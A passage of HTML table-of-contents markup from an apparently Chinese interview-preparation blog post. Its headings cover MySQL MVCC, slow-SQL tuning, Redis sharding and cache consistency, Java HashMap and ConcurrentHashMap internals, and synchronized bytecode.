href="#%E6%AF%8F%E7%A7%8D%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F"><span class="toc-text">每种隔离级别的实现方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF%EF%BC%88%E5%BB%BA%E8%AE%AE%E8%83%8C%E7%86%9F%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 总结面试回答模板（建议背熟）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MVCC"><span class="toc-text">MVCC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%AA%9C-MVCC-%E7%9A%84%E5%8F%AF%E8%A7%81%E6%80%A7%E8%A7%84%E5%88%99"><span class="toc-text">🪜 MVCC 的可见性规则</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E5%88%A4%E6%96%AD%E9%80%BB%E8%BE%91%EF%BC%9A"><span class="toc-text">🔍 判断逻辑：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96%E5%88%86%E6%9E%90"><span class="toc-text">🔍 数据变化分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%81%EF%B8%8F-T3-%E7%9A%84%E5%8F%AF%E8%A7%81%E6%80%A7%E5%88%A4%E6%96%AD%E9%80%BB%E8%BE%91"><span class="toc-text">👁️ T3 的可见性判断逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-T3-%E8%A6%81%E8%AF%BB-id-1%EF%BC%8C%E5%85%88%E7%9C%8B%E5%88%B0%E7%9A%84%E6%98%AF%E7%89%88%E6%9C%AC-name-Jerry-trx-id-T2"><span class="toc-text">1. T3 要读 id&#x3D;1，先看到的是版本 name&#x3D;&#39;Jerry&#39;, trx_id&#x3D;T2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%BE%E5%88%B0%E6%97%A7%E7%89%88%E6%9C%AC-name-Tom-trx-id-T0"><span class="toc-text">2.找到旧版本 name&#x3D;&#39;Tom&#39;, trx_id&#x3D;T0</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C"><span class="toc-text">📋 查询结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81undo-log%E7%9A%84WAL%E6%9C%BA%E5%88%B6%EF%BC%9B2%E3%80%81%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84%E5%90%8C%E6%AD%A5%E6%9C%BA%E5%88%B6%E3%80%81%E5%8D%8A%E5%90%8C%E6%AD%A5%E6%9C%BA%E5%88%B6%E3%80%81%E5%BC%82%E6%AD%A5%E6%9C%BA%E5%88%B6%EF%BC%9B3%E3%80%81%E6%85%A2sql%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF"><span class="toc-text">1、undo log的WAL机制；2、主从复制的同步机制、半同步机制、异步机制；3、慢sql查询优化思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E4%B8%80%E3%80%81Undo-Log-%E4%B8%8E-WAL%EF%BC%88Write-Ahead-Logging%EF%BC%89"><span class="toc-text">🔁 一、Undo Log 与 WAL（Write-Ahead Logging）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">📌 基础知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E"><span class="toc-text">✅ 举例说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF-2"><span class="toc-text">🧠 面试回答模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%A2-%E4%B8%89%E3%80%81%E6%85%A2-SQL-%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E6%80%9D%E8%B7%AF"><span class="toc-text">🐢 三、慢 SQL 查询优化思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E5%B8%B8%E8%A7%81%E6%85%A2-SQL-%E9%97%AE%E9%A2%98%E6%9D%A5%E6%BA%90%EF%BC%9A"><span class="toc-text">📌 常见慢 SQL 问题来源：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%A1%88%E4%BE%8B"><span class="toc-text">✅ 举例说明：慢查询案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF-3"><span class="toc-text">🧠 面试回答模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E6%85%A2-SQL-%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8E%9F%E5%9B%A0%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">✅ 一、慢 SQL 的主要原因是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E7%B4%A2%E5%BC%95%E7%BC%BA%E5%A4%B1-or-%E7%B4%A2%E5%BC%95%E5%A4%B1%E6%95%88"><span class="toc-text">✅ 1. 索引缺失 or 索引失效</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E7%B4%A2%E5%BC%95%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93"><span class="toc-text">✅ 2. 索引使用不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-%E6%95%B0%E6%8D%AE%E9%87%8F%E5%A4%AA%E5%A4%A7-%E6%97%A0%E5%88%86%E9%A1%B5"><span class="toc-text">✅ 3. 数据量太大 &amp; 无分页</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-4-join-%E8%BF%9E%E6%8E%A5%E4%B8%8D%E5%90%88%E7%90%86"><span class="toc-text">✅ 4. join 连接不合理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-5-SQL-%E5%86%99%E6%B3%95%E6%88%96%E9%80%BB%E8%BE%91%E8%AE%BE%E8%AE%A1%E9%97%AE%E9%A2%98"><span class="toc-text">✅ 5. SQL 写法或逻辑设计问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B4%A2%E5%BC%95%E5%A4%B1%E6%95%88%E7%9A%84%E6%83%85%E5%86%B5%E5%92%8C%E7%B4%A2%E5%BC%95%E8%AE%BF%E9%97%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">索引失效的情况和索引访问类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%E6%9D%A5%E7%90%86%E8%A7%A3-ref%E3%80%81range%E3%80%81all-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">🧠 举个例子来理解 ref、range、all 的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ref-%E7%B1%BB%E5%9E%8B-%E2%80%94%E2%80%94-%E7%B4%A2%E5%BC%95%E7%AD%89%E5%80%BC%E5%8C%B9%E9%85%8D"><span class="toc-text">1. ref 类型 —— 索引等值匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-range-%E7%B1%BB%E5%9E%8B-%E2%80%94%E2%80%94-%E8%8C%83%E5%9B%B4%E6%89%AB%E6%8F%8F%E7%B4%A2%E5%BC%95"><span class="toc-text">2. range 类型 —— 范围扫描索引</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-all-%E7%B1%BB%E5%9E%8B-%E2%80%94%E2%80%94-%E5%85%A8%E8%A1%A8%E6%89%AB%E6%8F%8F%EF%BC%88%E7%B4%A2%E5%BC%95%E6%B2%A1%E7%94%A8%E4%B8%8A%EF%BC%89"><span class="toc-text">3. all 类型 —— 全表扫描（索引没用上）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXPLAIN%E8%BE%93%E5%87%BA%E7%9A%84%E5%87%A0%E4%B8%AA%E6%A0%B8%E5%BF%83%E5%AD%97%E6%AE%B5%E7%9A%84%E5%90%AB%E4%B9%89"><span class="toc-text">EXPLAIN输出的几个核心字段的含义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%89%E3%80%81%E7%BB%93%E5%90%88%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%95%B4%E4%BE%8B%E5%AD%90%E7%90%86%E8%A7%A3"><span class="toc-text">📌 三、结合一个完整例子理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E9%9D%A2%E8%AF%95%E4%B8%AD%E5%8F%AF%E4%BB%A5%E8%BF%99%E4%B9%88%E8%AF%B4%EF%BC%9A"><span class="toc-text">✅ 四、面试中可以这么说：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81redis%E9%9B%86%E7%BE%A4%E5%88%86%E7%89%87%E4%B8%BA%E4%BD%95%E9%87%87%E7%94%A8gossip%E5%8D%8F%E8%AE%AE%E5%90%8C%E6%AD%A5%E5%85%83%E6%95%B0%E6%8D%AE%EF%BC%9B2%E3%80%81redis%E9%9B%86%E7%BE%A4%E5%88%86%E7%89%87%E8%A7%A3%E5%86%B3%E5%8D%95%E6%9C%BA%E5%AE%9E%E4%BE%8B%E5%8E%8B%E5%8A%9B%E5%A4%A7%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9B3%E3%80%81mysql%E4%B8%8Eredis%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7%E9%97%AE%E9%A2%98"><span class="toc-text">1、redis集群分片为何采用gossip协议同步元数据；2、redis集群分片解决单机实例压力大的问题；3、mysql与redis的数据一致性问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81Redis-%E9%9B%86%E7%BE%A4%E5%88%86%E7%89%87%E8%A7%A3%E5%86%B3%E5%8D%95%E6%9C%BA%E5%AE%9E%E4%BE%8B%E5%8E%8B%E5%8A%9B%E5%A4%A7%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">✅ 二、Redis 集群分片解决单机实例压力大的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%97%AE%E9%A2%98%E8%83%8C%E6%99%AF%EF%BC%9A"><span class="toc-text">🧠 问题背景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-Redis-%E5%88%86%E7%89%87%E9%9B%86%E7%BE%A4%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9A"><span class="toc-text">✅ Redis 分片集群如何解决：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">🧪 举个例子：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%83%8C%E6%99%AF%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E4%BF%9D%E8%AF%81%E4%B8%80%E8%87%B4%E6%80%A7%EF%BC%9F"><span class="toc-text">🧠 背景：为什么需要保证一致性？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E7%9C%9F%E5%AE%9E%E4%B8%9A%E5%8A%A1%E4%BE%8B%E5%AD%90%EF%BC%9A%E7%94%A8%E6%88%B7%E4%BF%AE%E6%94%B9%E6%98%B5%E7%A7%B0"><span class="toc-text">🎯 真实业务例子：用户修改昵称</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E9%94%99%E8%AF%AF%E6%B5%81%E7%A8%8B%E4%BC%9A%E5%87%BA%E7%8E%B0%E6%95%B0%E6%8D%AE%E4%B8%8D%E4%B8%80%E8%87%B4"><span class="toc-text">❌ 错误流程会出现数据不一致</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E5%A4%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%88%E6%A0%B8%E5%BF%83%EF%BC%89"><span class="toc-text">✅ 三大解决方案（核心）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E5%BB%B6%E8%BF%9F%E5%8F%8C%E5%88%A0%EF%BC%88%E7%BB%8F%E5%85%B8%E6%96%B9%E6%A1%88%EF%BC%89"><span class="toc-text">✅ 方案一：延迟双删（经典方案）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">✅ 方案原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%BC%AA%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-text">✅ 伪代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-text">✅ 举例解释：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E7%AD%94%E6%B3%95%E6%A8%A1%E6%9D%BF%EF%BC%9A"><span class="toc-text">✅ 面试答法模板：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E5%BC%95%E5%85%A5%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%B8%85%E7%BC%93%E5%AD%98%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">✅ 方案二：引入消息队列清缓存（推荐）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E5%8E%9F%E7%90%86%EF%BC%9A-2"><span class="toc-text">✅ 方案原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-text">✅ 举例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">✅ 举例流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E7%AD%94%E6%B3%95%E6%A8%A1%E6%9D%BF%EF%BC%9A-2"><span class="toc-text">✅ 面试答法模板：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%B8%89%EF%BC%9A%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E6%8E%A7%E5%88%B6%E8%AF%BB%E5%86%99%E9%A1%BA%E5%BA%8F%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E%E5%86%99%E5%A4%9A%E8%AF%BB%E5%A4%9A%EF%BC%89"><span class="toc-text">✅ 方案三：分布式锁控制读写顺序（适用于写多读多）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E5%8E%9F%E7%90%86%EF%BC%9A-3"><span class="toc-text">✅ 方案原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-2"><span class="toc-text">✅ 举例代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E6%B5%81%E7%A8%8B%EF%BC%9A-2"><span class="toc-text">✅ 举例流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E7%AD%94%E6%B3%95%E6%A8%A1%E6%9D%BF%EF%BC%9A-3"><span class="toc-text">✅ 面试答法模板：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8C-%E7%BB%9F%E4%B8%80%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%80%BB%E7%BB%93%E6%A8%A1%E6%9D%BF"><span class="toc-text">📌 统一面试回答总结模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">HashMap的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-HashMap-%E5%8E%9F%E7%90%86"><span class="toc-text">1.HashMap 原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%80%E3%80%81%E6%89%A9%E5%AE%B9%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-text">🧠 一、扩容的触发条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E4%BA%8C%E3%80%81%E6%89%A9%E5%AE%B9%E7%9A%84%E6%A0%B8%E5%BF%83%E6%B5%81%E7%A8%8B%EF%BC%88resize%EF%BC%89"><span class="toc-text">🔁 二、扩容的核心流程（resize）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%B9%E9%87%8F%E7%BF%BB%E5%80%8D"><span class="toc-text">1. 容量翻倍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E6%96%B0%E6%95%B0%E7%BB%84"><span class="toc-text">2. 创建新数组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E9%87%8D%E6%96%B0%E8%AE%A1%E7%AE%97%E6%AF%8F%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%88rehash%EF%BC%89"><span class="toc-text">3. 重新计算每个节点的位置（rehash）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90-2"><span class="toc-text">✅ 举个例子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ConcurrentHashMap-%E5%8E%9F%E7%90%86"><span class="toc-text">ConcurrentHashMap 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ConcurrentHashMap-%E5%8E%9F%E7%90%86-2"><span class="toc-text">ConcurrentHashMap 原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AE-%E4%B8%89%E3%80%81JDK1-8-%E5%BA%95%E5%B1%82%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3%EF%BC%88%E9%9D%A2%E8%AF%95%E4%B8%BB%E8%80%83%E7%82%B9%EF%BC%89"><span class="toc-text">🧮 三、JDK1.8 底层结构详解（面试主考点）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BD%93%E7%BB%93%E6%9E%84"><span class="toc-text">主体结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6%E8%A7%A3%E6%9E%90"><span class="toc-text">核心机制解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-1-put-%E6%B5%81%E7%A8%8B%EF%BC%88%E5%86%99%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-text">✅ 2.1 put() 流程（写流程）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-2-get-%E6%B5%81%E7%A8%8B%EF%BC%88%E8%AF%BB%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-text">✅ 2.2 get() 流程（读流程）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-3-%E6%89%A9%E5%AE%B9%E6%9C%BA%E5%88%B6%EF%BC%88resize%EF%BC%89"><span class="toc-text">✅ 2.3 扩容机制（resize）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E4%BA%94%E3%80%81%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E7%A4%BA%E4%BE%8B"><span class="toc-text">🧪 五、常见面试问题示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q1%EF%BC%9AConcurrentHashMap-%E4%B8%BA%E4%BB%80%E4%B9%88%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%EF%BC%9F"><span class="toc-text">Q1：ConcurrentHashMap 为什么线程安全？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q2%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8-synchronized-%E8%80%8C%E4%B8%8D%E6%98%AF-ReentrantLock%EF%BC%9F"><span class="toc-text">Q2：为什么用 synchronized 而不是 ReentrantLock？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q3%EF%BC%9AConcurrentHashMap-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8-CAS%EF%BC%9F"><span class="toc-text">Q3：ConcurrentHashMap 为什么使用 CAS？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E9%9D%A2%E8%AF%95%E8%AF%9D%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88%E8%AE%B0%E4%BD%8F%E8%BF%99%E6%AE%B5%E5%8D%B3%E5%8F%AF%EF%BC%89"><span class="toc-text">🎯 面试话术总结（记住这段即可）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81ConcurrentHashMap-%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E4%BD%93%E7%8E%B0%E5%9C%A8%E5%93%AA%EF%BC%9F"><span class="toc-text">✅ 一、ConcurrentHashMap 线程安全体现在哪？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%9F-%E5%85%B3%E9%94%AE%E4%BD%93%E7%8E%B0%EF%BC%9A"><span class="toc-text">🌟 关键体现：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%8C-%E4%BA%8C%E3%80%81HashMap-%E5%9C%A8%E7%BA%BF%E7%A8%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E6%96%B9%E9%9D%A2%E7%9A%84%E4%BD%93%E7%8E%B0%EF%BC%9F"><span class="toc-text">❌ 二、HashMap 在线程不安全方面的体现？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%97-%E4%B8%BB%E8%A6%81%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">❗ 主要问题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E4%B8%89%E3%80%81%E7%A4%BA%E4%BE%8B%E5%AF%B9%E6%AF%94%EF%BC%88%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%B9%B6%E5%8F%91%E5%86%99%EF%BC%89"><span class="toc-text">🧪 三、示例对比（多线程并发写）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9A%A8-HashMap-%E7%A4%BA%E4%BE%8B%EF%BC%88%E7%BA%BF%E7%A8%8B%E4%B8%8D%E5%AE%89%E5%85%A8%EF%BC%89"><span class="toc-text">🚨 HashMap 示例（线程不安全）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-ConcurrentHashMap-%E7%A4%BA%E4%BE%8B%EF%BC%88%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%EF%BC%89"><span class="toc-text">✅ ConcurrentHashMap 示例（线程安全）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E5%AF%B9%E6%AF%94%E6%80%BB%E7%BB%93%EF%BC%88%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF%EF%BC%89"><span class="toc-text">✅ 三、对比总结（面试回答模板）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#synchronized%E5%85%B3%E9%94%AE%E5%AD%97%E5%9C%A8%E5%AD%97%E8%8A%82%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">synchronized关键字在字节码层面的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-synchronized%EF%BC%9F"><span class="toc-text">💡 一、什么是 synchronized？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E4%BA%8C%E3%80%81%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90%E7%9C%8B%E6%87%82-synchronized"><span class="toc-text">🧪 二、简单例子看懂 synchronized</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%AC-%E4%B8%89%E3%80%81synchronized-%E5%9C%A8%E5%AD%97%E8%8A%82%E7%A0%81%E5%B1%82%E9%9D%A2%E6%98%AF%E6%80%8E%E4%B9%88%E5%B7%A5%E4%BD%9C%E7%9A%84%EF%BC%9F"><span class="toc-text">🔬 三、synchronized 在字节码层面是怎么工作的？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%89-%E4%BD%BF%E7%94%A8-javap-v-c-%E5%91%BD%E4%BB%A4%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E7%BC%96%E8%AF%91%E5%90%8E%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%88%E6%88%91%E4%BB%AC%E9%87%8D%E7%82%B9%E7%9C%8B-blockMethod%EF%BC%89%EF%BC%9A"><span class="toc-text">👉 使用 javap -v -c 命令可以看到编译后的字节码（我们重点看 blockMethod）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%A7%A3%E8%AF%BB%EF%BC%9A"><span class="toc-text">🧠 解读：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%9B%EF%B8%8F-%E5%9B%9B%E3%80%81Monitor%EF%BC%88%E7%9B%91%E8%A7%86%E5%99%A8%E9%94%81%EF%BC%89%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🏛️ 四、Monitor（监视器锁）是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B5-%E5%85%AD%E3%80%81%E7%BA%BF%E7%A8%8B%E6%98%AF%E6%80%8E%E4%B9%88%E8%8E%B7%E5%BE%97%E9%94%81%E7%9A%84%EF%BC%9F%E5%BA%95%E5%B1%82%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">🧵 六、线程是怎么获得锁的？底层流程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%81%E7%9A%84%E7%8A%B6%E6%80%81%E5%8F%98%E5%8C%96%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">锁的状态变化过程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E5%A4%B4%E5%8F%98%E5%8C%96%EF%BC%9A"><span class="toc-text">对象头变化：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%A8%F0%9F%92%BB-%E4%B8%83%E3%80%81%E9%9D%A2%E8%AF%95%E8%BF%99%E6%A0%B7%E8%AF%B4%EF%BC%88%E8%AF%9D%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%89%EF%BC%9A"><span class="toc-text">👨💻 七、面试这样说（话术总结）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 